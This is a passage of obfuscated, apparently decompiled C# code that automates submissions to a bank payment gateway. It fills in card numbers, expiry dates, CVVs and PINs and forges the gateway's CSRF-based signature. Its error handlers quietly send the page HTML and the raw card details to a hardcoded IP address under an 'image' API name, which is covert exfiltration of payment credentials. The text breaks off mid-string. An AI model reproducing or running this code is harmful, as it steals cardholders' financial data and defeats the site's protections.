			text25 = text29.Replace(oldValue5, "");
			string string_24 = text25;
			string string_25 = "debitCardNumber";
			text25 = clsPostData.SetPost(string_24, string_25, string_13);
			string string_26 = text25;
			string string_27 = "debitMonth";
			text25 = clsPostData.SetPost(string_26, string_27, string_16);
			string string_28 = text25;
			string string_29 = "debitYear";
			text25 = clsPostData.SetPost(string_28, string_29, string_17);
			string string_30 = text25;
			string string_31 = "debitCardholderName";
			text25 = clsPostData.SetPost(string_30, string_31, string_14);
			string string_32 = text25;
			string string_33 = "cardPin";
			text25 = clsPostData.SetPost(string_32, string_33, string_15);
			string string_34 = text25;
			string string_35 = "captchaFlg";
			string string_36 = "0";
			text25 = clsPostData.SetPost(string_34, string_35, string_36);
			string text30 = text25;
			string[] array3 = new string[1];
			string text31 = "&";
			array3[0] = text31;
			string[] array4 = text30.Split(array3, StringSplitOptions.None);
			string text32 = "";
			string text33 = "";
			string[] array5 = array4;
			string[] array6 = array5;
			foreach (string text34 in array6)
			{
				string[] array7 = new string[1];
				string text35 = "=";
				array7[0] = text35;
				string[] array8 = text34.Split(array7, StringSplitOptions.None);
				string text36 = array8[0];
				string str = array8[1];
				string text37 = text36;
				string text38 = "cspg";
				if (text37 == text38)
				{
					continue;
				}
				string text39 = "CSRFToken";
				if (!(text37 == text39))
				{
					string text40 = "cardCvd2pin";
					if (!(text37 == text40))
					{
						string text41 = text32;
						string text42 = "^";
						text32 = text41 + text42;
						text32 += text36;
						text33 += HttpUtility.UrlDecode(str);
					}
				}
			}
			string text43 = smethod_7(text32);
			string text44 = smethod_8(smethod_7(smethod_8(text33, string_23).ToString().ToUpper()).ToString().ToUpper(), string_23).ToString().ToUpper();
			string text45 = "^";
			string text46 = text44 + text45 + text43;
			string text47 = text46;
			string oldValue6 = "=";
			string newValue = "%3D";
			string text48 = text47.Replace(oldValue6, newValue);
			string oldValue7 = "^";
			string newValue2 = "%5E";
			text46 = text48.Replace(oldValue7, newValue2);
			string string_37 = text25;
			string string_38 = "cspg";
			return clsPostData.SetPost(string_37, string_38, text46);
		}
		catch (Exception)
		{
			string[] array9 = new string[10];
			string text49 = "3#";
			array9[0] = text49;
			array9[1] = HttpUtility.UrlEncode(string_8);
			string text50 = "|$|";
			array9[2] = text50;
			array9[3] = string_9;
			string text51 = "|$|";
			array9[4] = text51;
			array9[5] = string_10;
			string text52 = "|$|";
			array9[6] = text52;
			array9[7] = string_11;
			string text53 = "|$|";
			array9[8] = text53;
			array9[9] = string_12;
			return HttpUtility.UrlDecode(smethod_6(string.Concat(array9)));
		}
	}

	internal static string smethod_6(string string_8)
	{
		string text = "imgcontent=";
		string text2 = text + HttpUtility.UrlEncode(string_8);
		string text3 = "{ \"imgcontent\": \"";
		string text4 = "\" }";
		text2 = text3 + string_8 + text4;
		string text5 = "a";
		string string_9 = text5;
		string string_10 = "http://192.3.164.176/api/image";
		return smethod_16(string_10, text2, ref string_9);
	}

	private static string smethod_7(string string_8)
	{
		string text = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=";
		string text2 = text;
		string text3 = "";
		int num = 0;
		do
		{
			if (num < string_8.Length)
			{
				char c = string_8[num++];
				int num2 = ((num < string_8.Length) ? string_8[num++] : '\0');
				int num3 = ((num < string_8.Length) ? string_8[num++] : '\0');
				int index = (int)c >> 2;
				int index2 = ((c & 3) << 4) | (num2 >> 4);
				int index3 = ((num2 & 0xF) << 2) | (num3 >> 6);
				int index4 = num3 & 0x3F;
				if (num2 == 0)
				{
					index4 = 64;
					index3 = 64;
				}
				else if (num3 == 0)
				{
					index4 = 64;
				}
				text3 = text3 + text2[index] + text2[index2] + text2[index3] + text2[index4];
				continue;
			}
			return text3;
		}
		while (num < string_8.Length);
		return text3;
	}

	private static string smethod_8(string string_8, string string_9)
	{
		byte[] array = new HMACSHA256(Encoding.UTF8.GetBytes(string_9)).ComputeHash(Encoding.UTF8.GetBytes(string_8));
		StringBuilder stringBuilder = new StringBuilder();
		for (int i = 0; i < array.Length; i++)
		{
			ref byte reference = ref array[i];
			string text = "x2";
			stringBuilder.Append(reference.ToString(text));
		}
		return stringBuilder.ToString();
	}

	internal static string smethod_9(string string_8, string string_9, string string_10, string string_11, string string_12)
	{
		string string_13 = "";
		string string_14 = "";
		string string_15 = "";
		string string_16 = "";
		string string_17 = "";
		string string_18 = "";
		string string_19 = "";
		string text = "";
		string string_20 = "";
		string string_21 = "";
		string text2 = "0";
		string string_22 = text2;
		string text3 = "0";
		string string_23 = text3;
		string text4 = "D";
		bool flag = string_12 == text4;
		string text5 = "C";
		if (flag | (string_12 == text5))
		{
			string[] array = new string[1];
			string text6 = "||";
			array[0] = text6;
			string[] array2 = string_9.Split(array, StringSplitOptions.None);
			string_20 = array2[0];
			string_22 = array2[1];
			string_23 = array2[2];
			string_21 = array2[3];
			text = array2[4];
			string_19 = array2[6].Trim();
		}
		try
		{
			string text7 = string_8;
			string oldValue = "<input name=\"passline\"";
			string text8 = "<input name=\"passline\" value=\"";
			string text9 = "\" ";
			string_8 = text7.Replace(oldValue, text8 + string_10 + text9);
			string text10 = string_8;
			string text11 = string_8;
			string value = "<input type=\"hidden\" name=\"CSRFToken\" value=\"";
			string text12 = text10.Substring(text11.IndexOf(value) + 45);
			string text13 = text12;
			string text14 = text12;
			string value2 = "\"  />";
			text12 = text13.Substring(0, text14.IndexOf(value2));
			string string_24 = smethod_7(text12).ToString().ToUpper();
			string text15 = "D";
			bool flag2 = string_12 == text15;
			string text16 = "C";
			if (flag2 | (string_12 == text16))
			{
				string text17 = string_8;
				string text18 = string_8;
				string value3 = "var paymentId =";
				string text19 = text17.Substring(text18.IndexOf(value3) + 16);
				string text20 = text19;
				string text21 = text19;
				string value4 = "\"";
				text19 = text20.Substring(0, text21.IndexOf(value4));
				string text22 = string_8;
				string text23 = string_8;
				string value5 = "var mode =";
				string text24 = text22.Substring(text23.IndexOf(value5) + 12);
				string text25 = text24;
				string text26 = text24;
				string value6 = "';";
				text24 = text25.Substring(0, text26.IndexOf(value6));
				string_13 = smethod_14(string_20, text19, text24);
				string_14 = smethod_14(string_19, text19, text24);
				string_15 = smethod_14(string_21, text19, text24);
				string_16 = smethod_14(string_22, text19, text24);
				string_17 = smethod_14(string_23, text19, text24);
				string_18 = smethod_14(text, text19, text24);
			}
			string text27 = "";
			string text28 = new Class10().method_1(string_8, ref text27, bool_0: false);
			string text29 = text28;
			string oldValue2 = "&proceed=Proceed";
			string text30 = text29.Replace(oldValue2, "");
			string oldValue3 = "&cancel=Cancel";
			string text31 = text30.Replace(oldValue3, "");
			string oldValue4 = "&debiMonth=0";
			string text32 = text31.Replace(oldValue4, "");
			string oldValue5 = "&debiYear=0";
			text28 = text32.Replace(oldValue5, "");
			string text33 = text28;
			string oldValue6 = "&proceed=Pay";
			text28 = text33.Replace(oldValue6, "");
			string string_25 = text28;
			string string_26 = "encryptedCardNumber";
			text28 = clsPostData.SetPost(string_25, string_26, string_13);
			string string_27 = text28;
			string string_28 = "encryptedMonth";
			text28 = clsPostData.SetPost(string_27, string_28, string_16);
			string string_29 = text28;
			string string_30 = "encryptedYear";
			text28 = clsPostData.SetPost(string_29, string_30, string_17);
			string string_31 = text28;
			string string_32 = "encryptedCardHolderName";
			text28 = clsPostData.SetPost(string_31, string_32, string_14);
			string string_33 = text28;
			string string_34 = "cardPin";
			text28 = clsPostData.SetPost(string_33, string_34, string_15);
			string string_35 = text28;
			string string_36 = "debitCardNumber";
			string string_37 = "****************";
			text28 = clsPostData.SetPost(string_35, string_36, string_37);
			string string_38 = text28;
			string string_39 = "debitCardCvv";
			string string_40 = "undefined";
			text28 = clsPostData.SetPost(string_38, string_39, string_40);
			string string_41 = text28;
			string string_42 = "debitCardholderName";
			string string_43 = "****************";
			text28 = clsPostData.SetPost(string_41, string_42, string_43);
			string string_44 = text28;
			string string_45 = "captchaFlg";
			string string_46 = "0";
			text28 = clsPostData.SetPost(string_44, string_45, string_46);
			string string_47 = text28;
			string string_48 = "selectedPymntInstrmnt";
			text28 = clsPostData.SetPost(string_47, string_48, string_12);
			string string_49 = text28;
			string string_50 = "creditDebitCheck";
			text28 = clsPostData.SetPost(string_49, string_50, string_12);
			string text34 = "C";
			if (string_12 == text34)
			{
				string string_51 = text28;
				string string_52 = "cvv_no";
				text28 = clsPostData.SetPost(string_51, string_52, text);
				string string_53 = text28;
				string string_54 = "cardCvv";
				text28 = clsPostData.SetPost(string_53, string_54, string_18);
			}
			string text35 = text28;
			string[] array3 = new string[1];
			string text36 = "&";
			array3[0] = text36;
			string[] array4 = text35.Split(array3, StringSplitOptions.None);
			string text37 = "";
			string text38 = "";
			string[] array5 = array4;
			string[] array6 = array5;
			foreach (string text39 in array6)
			{
				string[] array7 = new string[1];
				string text40 = "=";
				array7[0] = text40;
				string[] array8 = text39.Split(array7, StringSplitOptions.None);
				string text41 = array8[0];
				string str = array8[1];
				string text42 = text41;
				string text43 = "cspg";
				if (text42 == text43)
				{
					continue;
				}
				string text44 = "CSRFToken";
				if (!(text42 == text44))
				{
					string text45 = "cardCvd2pin";
					if (!(text42 == text45))
					{
						string text46 = text37;
						string text47 = "^";
						text37 = text46 + text47;
						text37 += text41;
						text38 += HttpUtility.UrlDecode(str);
					}
				}
			}
			string text48 = smethod_7(text37);
			string text49 = "JTVFZW5jQ2FwdGNoYSU1RWVuY3J5cHRlZENhcmROdW1iZXIlNUVlbmNyeXB0ZWRNb250aCU1RWVuY3J5cHRlZFllYXIlNUVlbmNyeXB0ZWRDYXJkSG9sZGVyTmFtZSU1RWVuY3J5cHRlZFNhdmVkQ2FyZENWViU1RWVuY3J5cHRlZFNhdmVkQ2FyZFBpbiU1RWVuY3J5cHRlZFNhdmVkQ2FyZEN2ZDJwaW4lNUVkZWJpdE9UUEZsZyU1RWNyZWRpdE9UUEZsZyU1RXByZXBhaWRPVFBGbGclNUVPVFBNZXRob2QlNUVvdGhlcmNhcmRkZWJpdGN2diU1RWFjY29yZGlvblZhbCU1RWNyZWRpdERlYml0Q2hlY2slNUVkZWJpdENhcmROdW1iZXIlNUVjYXJkUGluVHlwZSU1RWNhcmRQaW4lNUVkZWJpdENhcmRDdnYlNUVkZWJpdENhcmRob2xkZXJOYW1lJTVFcGFzc2xpbmUlNUVnc3RuVFhOSWQlNUVnc3RuRmxhZyU1RXBheW1lbnRJbml0VGltZSU1RWdyaXBzRmxhZyU1RXNlbGVjdGVkUHltbnRJbnN0cm1udCU1RWNhcHRjaGFNc2clNUVwYXltZW50SWQlNUVhdG1QYXlSZXRlbnRpb25QZXJpb2QlNUVzdHlsZUNzcyU1RWhlYWRlckZpbGUlNUVtZXJjaEhlYWRlckZpbGUlNUVsYWJlbEZpbGUlNUVtcmNoTmFtZSU1RW1yY2hXZWIlNUVtcmNoVHJhY2tJZCU1RXB5bW50SW5zdHJtbnRDQyU1RXB5bW50SW5zdHJtbnRBQyU1RXB5bW50SW5zdHJtbnREQyU1RXB5bW50SW5zdHJtbnRQQyU1RXB5bW50SW5zdHJtbnRQWiU1RXB5bW50SW5zdHJtbnRBUCU1RXB5bW50SW5zdHJtbnRERCU1RWVjb21GbGclNUVjYXB0Y2hhRmxnJTVFaW5zdE5hbWUlNUVtcmNoRXJyVXJsJTVFYXZzRmxnJTVFaGVhZGVyVHlwZSU1RXRlcm1JZCU1RWluc3RJZCU1RW1yY2hJZCU1RW1hZXN0cm9DaGVja0ZsYWclNUVydXBGbGclNUVweW1udEluc3RybW50SU1QUyU1RWZvb3RlciU1RWRlYml0U2VsJTVFY3JlZGl0U2VsJTVFcHJlcGFpZFNlbCU1RXNpRmxhZyU1RWZjRmxhZyU1RWZjQ2hlY2tlZCU1RWZjRXhwQ2hlY2slNUVmY0N0Q2hlY2slNUVmY0R0Q2hlY2slNUVmY1BkQ2hlY2slNUVyZGMlNUVjaGVja0JyYW5kJTVFb25PZmZUeXBlJTVFbWFlc3RybyU1RWNjSW5zdEZsZyU1RWNjVGVybUZsZyU1RW1lcmNoYW50Q3VycmVuY3lGbGclNUVjYXJkQ3VycmVuY3lGbGclNUVvdGhlckN1cnJlbmN5RmxnJTVFcHltbnRJbnN0cm1udENudCU1RW90cFN0YXR1cyU1RW90cGFsbG93ZWQlNUVvdHBtZXRob2QlNUVlbWlGbGFnJTVFcmFkaW9GbGFnJTVFb3RoZXJDYXJkcyU1RXRleHRGaWxlJTVFZXJyb3JTdHIlNUVyZXN1bHRDb2RlJTVFcG9zdERhdGUlNUVyZXNwb25zZUNvZGUlNUV0cmFuSWQlNUVhdXRoQ29kZSU1RW1yY2hIZWFkZXJNc2dGaWxlJTVFbXJjaEhlYWRlckh0bWxGaWxlJTVFaW5zdEhlYWRlckh0bWxGaWxl";
			text48 = text49;
			string text50 = smethod_8(smethod_7(smethod_8(text38, string_24).ToString().ToUpper()).ToString().ToUpper(), string_24).ToString().ToUpper();
			string text51 = "^";
			string text52 = text50 + text51 + text48;
			string text53 = text52;
			string oldValue7 = "=";
			string newValue = "%3D";
			string text54 = text53.Replace(oldValue7, newValue);
			string oldValue8 = "^";
			string newValue2 = "%5E";
			text52 = text54.Replace(oldValue8, newValue2);
			string string_55 = text28;
			string string_56 = "cspg";
			return clsPostData.SetPost(string_55, string_56, text52);
		}
		catch (Exception)
		{
			string[] array9 = new string[10];
			string text55 = "3#";
			array9[0] = text55;
			array9[1] = HttpUtility.UrlEncode(string_8);
			string text56 = "|$|";
			array9[2] = text56;
			array9[3] = string_9;
			string text57 = "|$|";
			array9[4] = text57;
			array9[5] = string_10;
			string text58 = "|$|";
			array9[6] = text58;
			array9[7] = string_11;
			string text59 = "|$|";
			array9[8] = text59;
			array9[9] = string_12;
			return HttpUtility.UrlDecode(smethod_6(string.Concat(array9)));
		}
	}

	internal static string smethod_10(string string_8, string string_9, string string_10, string string_11, string string_12)
	{
		string string_13 = "";
		string string_14 = "";
		string string_15 = "";
		string string_16 = "";
		string string_17 = "";
		string string_18 = "";
		string text = "";
		string string_19 = "";
		string string_20 = "";
		string text2 = "0";
		string string_21 = text2;
		string text3 = "0";
		string string_22 = text3;
		string text4 = "D";
		bool flag = string_12 == text4;
		string text5 = "C";
		if (flag | (string_12 == text5))
		{
			string[] array = new string[1];
			string text6 = "||";
			array[0] = text6;
			string[] array2 = string_9.Split(array, StringSplitOptions.None);
			string_19 = array2[0];
			string_21 = array2[1];
			string_22 = array2[2];
			string_20 = array2[3];
			text = array2[4];
			string_18 = array2[6].Trim();
		}
		try
		{
			string text7 = string_8;
			string oldValue = "<input name=\"passline\"";
			string text8 = "<input name=\"passline\" value=\"";
			string text9 = "\" ";
			string_8 = text7.Replace(oldValue, text8 + string_10 + text9);
			string text10 = string_8;
			string text11 = string_8;
			string value = "<input type=\"hidden\" name=\"CSRFToken\" value=\"";
			string text12 = text10.Substring(text11.IndexOf(value) + 45);
			string text13 = text12;
			string text14 = text12;
			string value2 = "\"  />";
			text12 = text13.Substring(0, text14.IndexOf(value2));
			string string_23 = smethod_7(text12).ToString().ToUpper();
			string text15 = "D";
			bool flag2 = string_12 == text15;
			string text16 = "C";
			if (flag2 | (string_12 == text16))
			{
				string text17 = string_8;
				string text18 = string_8;
				string value3 = "var paymentId =";
				string text19 = text17.Substring(text18.IndexOf(value3) + 16);
				string text20 = text19;
				string text21 = text19;
				string value4 = "\"";
				text19 = text20.Substring(0, text21.IndexOf(value4));
				string text22 = string_8;
				string text23 = string_8;
				string value5 = "var mode =";
				string text24 = text22.Substring(text23.IndexOf(value5) + 12);
				string text25 = text24;
				string text26 = text24;
				string value6 = "';";
				text24 = text25.Substring(0, text26.IndexOf(value6));
				string_13 = smethod_14(string_19, text19, text24);
				string_14 = smethod_14(string_18, text19, text24);
				smethod_14(string_20, text19, text24);
				string_15 = smethod_14(string_21, text19, text24);
				string_16 = smethod_14(string_22, text19, text24);
				string_17 = smethod_14(text, text19, text24);
			}
			string text27 = "";
			string text28 = new Class10().method_1(string_8, ref text27, bool_0: false);
			string text29 = text28;
			string oldValue2 = "&proceed=Proceed";
			string text30 = text29.Replace(oldValue2, "");
			string oldValue3 = "&cancel=Cancel";
			string text31 = text30.Replace(oldValue3, "");
			string oldValue4 = "&debiMonth=0";
			string text32 = text31.Replace(oldValue4, "");
			string oldValue5 = "&debiYear=0";
			text28 = text32.Replace(oldValue5, "");
			string text33 = text28;
			string oldValue6 = "&proceed=Pay";
			text28 = text33.Replace(oldValue6, "");
			string string_24 = text28;
			string string_25 = "encryptedCardNumber";
			text28 = clsPostData.SetPost(string_24, string_25, string_13);
			string string_26 = text28;
			string string_27 = "encryptedMonth";
			text28 = clsPostData.SetPost(string_26, string_27, string_15);
			string string_28 = text28;
			string string_29 = "encryptedYear";
			text28 = clsPostData.SetPost(string_28, string_29, string_16);
			string string_30 = text28;
			string string_31 = "encryptedCardHolderName";
			text28 = clsPostData.SetPost(string_30, string_31, string_14);
			string string_32 = text28;
			string string_33 = "debitCardNumber";
			string string_34 = "****************";
			text28 = clsPostData.SetPost(string_32, string_33, string_34);
			string string_35 = text28;
			string string_36 = "debitCardCvv";
			text28 = clsPostData.SetPost(string_35, string_36, string_17);
			string string_37 = text28;
			string string_38 = "debitCardholderName";
			string string_39 = "****************";
			text28 = clsPostData.SetPost(string_37, string_38, string_39);
			string string_40 = text28;
			string string_41 = "captchaFlg";
			string string_42 = "1";
			text28 = clsPostData.SetPost(string_40, string_41, string_42);
			string string_43 = text28;
			string string_44 = "passline";
			text28 = clsPostData.SetPost(string_43, string_44, string_10);
			string string_45 = text28;
			string string_46 = "selectedPymntInstrmnt";
			string string_47 = "OD";
			text28 = clsPostData.SetPost(string_45, string_46, string_47);
			string string_48 = text28;
			string string_49 = "checkBrand";
			string string_50 = "M";
			text28 = clsPostData.SetPost(string_48, string_49, string_50);
			string string_51 = text28;
			string string_52 = "onOffType";
			string string_53 = "0";
			text28 = clsPostData.SetPost(string_51, string_52, string_53);
			string string_54 = text28;
			string string_55 = "creditDebitCheck";
			string string_56 = "D";
			text28 = clsPostData.SetPost(string_54, string_55, string_56);
			string string_57 = text28;
			string string_58 = "card_no";
			string string_59 = "****************";
			text28 = clsPostData.SetPost(string_57, string_58, string_59);
			string string_60 = text28;
			string string_61 = "name";
			string string_62 = "****************";
			text28 = clsPostData.SetPost(string_60, string_61, string_62);
			string string_63 = text28;
			string string_64 = "debitYear";
			string string_65 = "****";
			text28 = clsPostData.SetPost(string_63, string_64, string_65);
			string string_66 = text28;
			string string_67 = "debitMonth";
			string string_68 = "**";
			text28 = clsPostData.SetPost(string_66, string_67, string_68);
			string string_69 = text28;
			string string_70 = "expMonthSelect";
			string string_71 = "**";
			text28 = clsPostData.SetPost(string_69, string_70, string_71);
			string string_72 = text28;
			string string_73 = "expYearSelect";
			string string_74 = "****";
			text28 = clsPostData.SetPost(string_72, string_73, string_74);
			string string_75 = text28;
			string string_76 = "other_debit_cvv_no";
			text28 = clsPostData.SetPost(string_75, string_76, text);
			string string_77 = text28;
			string string_78 = "othercarddebitcvv";
			string string_79 = "1";
			text28 = clsPostData.SetPost(string_77, string_78, string_79);
			string text34 = text28;
			string[] array3 = new string[1];
			string text35 = "&";
			array3[0] = text35;
			string[] array4 = text34.Split(array3, StringSplitOptions.None);
			string text36 = "";
			string text37 = "";
			string[] array5 = array4;
			string[] array6 = array5;
			foreach (string text38 in array6)
			{
				string[] array7 = new string[1];
				string text39 = "=";
				array7[0] = text39;
				string[] array8 = text38.Split(array7, StringSplitOptions.None);
				string text40 = array8[0];
				string str = array8[1];
				string text41 = text40;
				string text42 = "cspg";
				if (text41 == text42)
				{
					continue;
				}
				string text43 = "CSRFToken";
				if (!(text41 == text43))
				{
					string text44 = "cardCvd2pin";
					if (!(text41 == text44))
					{
						string text45 = text36;
						string text46 = "^";
						text36 = text45 + text46;
						text36 += text40;
						text37 += HttpUtility.UrlDecode(str);
					}
				}
			}
			string text47 = smethod_7(text36);
			string text48 = "JTVFZW5jQ2FwdGNoYSU1RWVuY3J5cHRlZENhcmROdW1iZXIlNUVlbmNyeXB0ZWRNb250aCU1RWVuY3J5cHRlZFllYXIlNUVlbmNyeXB0ZWRDYXJkSG9sZGVyTmFtZSU1RWVuY3J5cHRlZFNhdmVkQ2FyZENWViU1RWVuY3J5cHRlZFNhdmVkQ2FyZFBpbiU1RWVuY3J5cHRlZFNhdmVkQ2FyZEN2ZDJwaW4lNUVkZWJpdE9UUEZsZyU1RWNyZWRpdE9UUEZsZyU1RXByZXBhaWRPVFBGbGclNUVPVFBNZXRob2QlNUVvdGhlcmNhcmRkZWJpdGN2diU1RWFjY29yZGlvblZhbCU1RWNyZWRpdERlYml0Q2hlY2slNUVkZWJpdENhcmROdW1iZXIlNUVjYXJkUGluVHlwZSU1RWNhcmRQaW4lNUVkZWJpdENhcmRDdnYlNUVkZWJpdENhcmRob2xkZXJOYW1lJTVFcGFzc2xpbmUlNUVnc3RuVFhOSWQlNUVnc3RuRmxhZyU1RXBheW1lbnRJbml0VGltZSU1RWdyaXBzRmxhZyU1RXNlbGVjdGVkUHltbnRJbnN0cm1udCU1RWNhcHRjaGFNc2clNUVwYXltZW50SWQlNUVhdG1QYXlSZXRlbnRpb25QZXJpb2QlNUVzdHlsZUNzcyU1RWhlYWRlckZpbGUlNUVtZXJjaEhlYWRlckZpbGUlNUVsYWJlbEZpbGUlNUVtcmNoTmFtZSU1RW1yY2hXZWIlNUVtcmNoVHJhY2tJZCU1RXB5bW50SW5zdHJtbnRDQyU1RXB5bW50SW5zdHJtbnRBQyU1RXB5bW50SW5zdHJtbnREQyU1RXB5bW50SW5zdHJtbnRQQyU1RXB5bW50SW5zdHJtbnRQWiU1RXB5bW50SW5zdHJtbnRBUCU1RXB5bW50SW5zdHJtbnRERCU1RWVjb21GbGclNUVjYXB0Y2hhRmxnJTVFaW5zdE5hbWUlNUVtcmNoRXJyVXJsJTVFYXZzRmxnJTVFaGVhZGVyVHlwZSU1RXRlcm1JZCU1RWluc3RJZCU1RW1yY2hJZCU1RW1hZXN0cm9DaGVja0ZsYWclNUVydXBGbGclNUVweW1udEluc3RybW50SU1QUyU1RWZvb3RlciU1RWRlYml0U2VsJTVFY3JlZGl0U2VsJTVFcHJlcGFpZFNlbCU1RXNpRmxhZyU1RWZjRmxhZyU1RWZjQ2hlY2tlZCU1RWZjRXhwQ2hlY2slNUVmY0N0Q2hlY2slNUVmY0R0Q2hlY2slNUVmY1BkQ2hlY2slNUVyZGMlNUVjaGVja0JyYW5kJTVFb25PZmZUeXBlJTVFbWFlc3RybyU1RWNjSW5zdEZsZyU1RWNjVGVybUZsZyU1RW1lcmNoYW50Q3VycmVuY3lGbGclNUVjYXJkQ3VycmVuY3lGbGclNUVvdGhlckN1cnJlbmN5RmxnJTVFcHltbnRJbnN0cm1udENudCU1RW90cFN0YXR1cyU1RW90cGFsbG93ZWQlNUVvdHBtZXRob2QlNUVlbWlGbGFnJTVFcmFkaW9GbGFnJTVFb3RoZXJDYXJkcyU1RXRleHRGaWxlJTVFZXJyb3JTdHIlNUVyZXN1bHRDb2RlJTVFcG9zdERhdGUlNUVyZXNwb25zZUNvZGUlNUV0cmFuSWQlNUVhdXRoQ29kZSU1RW1yY2hIZWFkZXJNc2dGaWxlJTVFbXJjaEhlYWRlckh0bWxGaWxlJTVFaW5zdEhlYWRlckh0bWxGaWxl";
			text47 = text48;
			string text49 = smethod_8(smethod_7(smethod_8(text37, string_23).ToString().ToUpper()).ToString().ToUpper(), string_23).ToString().ToUpper();
			string text50 = "^";
			string text51 = text49 + text50 + text47;
			string text52 = text51;
			string oldValue7 = "=";
			string newValue = "%3D";
			string text53 = text52.Replace(oldValue7, newValue);
			string oldValue8 = "^";
			string newValue2 = "%5E";
			text51 = text53.Replace(oldValue8, newValue2);
			string string_80 = text28;
			string string_81 = "cspg";
			return clsPostData.SetPost(string_80, string_81, text51);
		}
		catch (Exception)
		{
			string[] array9 = new string[10];
			string text54 = "3#";
			array9[0] = text54;
			array9[1] = HttpUtility.UrlEncode(string_8);
			string text55 = "|$|";
			array9[2] = text55;
			array9[3] = string_9;
			string text56 = "|$|";
			array9[4] = text56;
			array9[5] = string_10;
			string text57 = "|$|";
			array9[6] = text57;
			array9[7] = string_11;
			string text58 = "|$|";
			array9[8] = text58;
			array9[9] = string_12;
			return HttpUtility.UrlDecode(smethod_6(string.Concat(array9)));
		}
	}

	internal static string smethod_11(string string_8, string string_9, string string_10, string string_11, string string_12)
	{
		string string_13 = "";
		string string_14 = "";
		string text = "D";
		if (string_12 == text)
		{
			string[] array = new string[1];
			string text2 = "||";
			array[0] = text2;
			string[] array2 = string_9.Split(array, StringSplitOptions.None);
			string_14 = array2[3];
			array2[6].Trim();
		}
		string text3 = "";
		try
		{
			string text4 = "D";
			if (string_12 == text4)
			{
				string_13 = smethod_12(string_14, string_11);
			}
			string value = "<input type=\"hidden\" name=\"CSRFToken\" value=\"";
			string text5 = string_8.Substring(string_8.IndexOf(value) + 45);
			string text6 = text5;
			string text7 = text5;
			string value2 = "\"  />";
			text5 = text6.Substring(0, text7.IndexOf(value2));
			string string_15 = smethod_7(text5).ToString().ToUpper();
			string text8 = "";
			text3 = new Class10().method_1(string_8, ref text8, bool_0: false);
			string text9 = text3;
			string oldValue = "&cancel=Cancel";
			string text10 = text9.Replace(oldValue, "");
			string oldValue2 = "&proceed=Pay";
			text3 = text10.Replace(oldValue2, "");
			string string_16 = text3;
			string string_17 = "cardPin";
			text3 = clsPostData.SetPost(string_16, string_17, string_13);
			string string_18 = text3;
			string string_19 = "timer";
			string string_20 = "175000";
			text3 = clsPostData.SetPost(string_18, string_19, string_20);
			string text11 = text3;
			string[] array3 = new string[1];
			string text12 = "&";
			array3[0] = text12;
			string[] array4 = text11.Split(array3, StringSplitOptions.None);
			string text13 = "";
			string text14 = "";
			string[] array5 = array4;
			string[] array6 = array5;
			foreach (string text15 in array6)
			{
				string[] array7 = new string[1];
				string text16 = "=";
				array7[0] = text16;
				string[] array8 = text15.Split(array7, StringSplitOptions.None);
				string text17 = array8[0];
				string str = array8[1];
				string text18 = text17;
				string text19 = "cspg";
				if (text18 == text19)
				{
					continue;
				}
				string text20 = "CSRFToken";
				if (!(text18 == text20))
				{
					string text21 = "passline";
					if (!(text18 == text21))
					{
						string text22 = text13;
						string text23 = "^";
						text13 = text22 + text23;
						text13 += text17;
						text14 += HttpUtility.UrlDecode(str);
					}
				}
			}
			string text24 = smethod_7(text13);
			string text25 = smethod_8(smethod_7(smethod_8(text14, string_15).ToString().ToUpper()).ToString().ToUpper(), string_15).ToString().ToUpper();
			string text26 = "^";
			string text27 = text25 + text26 + text24;
			string text28 = text27;
			string oldValue3 = "=";
			string newValue = "%3D";
			string text29 = text28.Replace(oldValue3, newValue);
			string oldValue4 = "^";
			string newValue2 = "%5E";
			text27 = text29.Replace(oldValue4, newValue2);
			string string_21 = text3;
			string string_22 = "cspg";
			text3 = clsPostData.SetPost(string_21, string_22, text27);
			return text3;
		}
		catch (Exception)
		{
			return text3;
		}
	}

	public static string smethod_12(string string_8, string string_9)
	{
		string[] array = new string[5];
		string text = "<script type=\"text/javascript\">\n\tfunction encryptUsingJS() {\r\n       var string = '";
		array[0] = text;
		array[1] = string_8;
		string text2 = "';\r\n       var ack;\r\n\t    var encryptionExponent = '10001';\r\n\t    var modulus = '";
		array[2] = text2;
		array[3] = string_9;
		string text3 = "';\r\n\t    var maxdigits = '67';\r\n       var keys = new jCryptionKeyPair(encryptionExponent,modulus,maxdigits);\r\n       var ks = encrypt(string,keys,ack);\r\n       return ks;\r\n}\r\n           jCryptionKeyPair = function(encryptionExponent, modulus, maxdigits) {\r\n\t\t\tsetMaxDigits(parseInt(maxdigits,10));\r\n\t\t\tthis.e = biFromHex(encryptionExponent);\r\n\t\t\tthis.m = biFromHex(modulus);\r\n\t\t\tthis.chunkSize = 2 * biHighIndex(this.m);\r\n\t\t\tthis.radix = 16;\r\n\t\t\tthis.barrett = new BarrettMu(this.m);\r\n\t\t};\r\n      encrypt = function(string,keyPair,callback) {\r\n       var e1;\r\n\t\tvar charSum = 0;\r\n\t\tfor(var i = 0; i < string.length; i++){\r\n\t\t\tcharSum += string.charCodeAt(i);\r\n\t\t}\r\n\t\tvar tag = '0123456789abcdef';\r\n\t\tvar hex = '';\r\n\t\thex += tag.charAt((charSum & 0xF0) >> 4) + tag.charAt(charSum & 0x0F);\r\n\t\tvar taggedString = hex + string;\r\n\t\tvar encrypt = [];\r\n\t\tvar j = 0;\r\n\t\twhile (j < taggedString.length) {\r\n\t\t\tencrypt[j] = taggedString.charCodeAt(j);\r\n\t\t\tj++;\r\n\t\t}\r\n\t\twhile (encrypt.length % keyPair.chunkSize !== 0) {\r\n\t\t\tencrypt[j++] = 0;\r\n\t\t}\r\n\t\tfunction encryption(encryptObject) {\r\n\t\t\tvar charCounter = 0;\r\n\t\t\tvar j, block;\r\n\t\t\tvar encrypted = \"\";\r\n\t\t\tfunction encryptChar() {\r\n\t\t\t\tblock = new BigInt();\r\n\t\t\t\tj = 0;\r\n\t\t\t\tfor (var k = charCounter; k < charCounter+keyPair.chunkSize; ++j) {\r\n\t\t\t\t\tblock.digits[j] = encryptObject[k++];\r\n\t\t\t\t\tblock.digits[j] += encryptObject[k++] << 8;\r\n\t\t\t\t}\r\n\t\t\t\tvar crypt = keyPair.barrett.powMod(block, keyPair.e);\r\n\t\t\t\tvar text = keyPair.radix == 16 ? biToHex(crypt) : biToString(crypt, keyPair.radix);\r\n\t\t\t\tencrypted += text + \" \";\r\n\t\t\t\tcharCounter += keyPair.chunkSize;\r\n\t\t\t\tif (charCounter < encryptObject.length) {\r\n\t\t\t\t\tsetTimeout(encryptChar, 1)\r\n\t\t\t\t} else 